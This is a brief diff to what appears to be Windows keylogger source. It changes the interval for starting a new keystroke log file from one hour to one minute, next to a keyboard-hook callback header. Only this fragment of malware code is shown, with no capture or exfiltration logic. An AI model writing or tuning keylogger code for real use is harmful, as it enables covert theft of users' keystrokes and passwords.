@@ -1,7 +1,7 @@
 #include "Keylogger.h"
 
 time_t start, end;
-#define NEW_FILE_NUM_SECONDS 3600 
+#define NEW_FILE_NUM_SECONDS 60 
 static LPCWSTR current_filename;
 
 LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam)
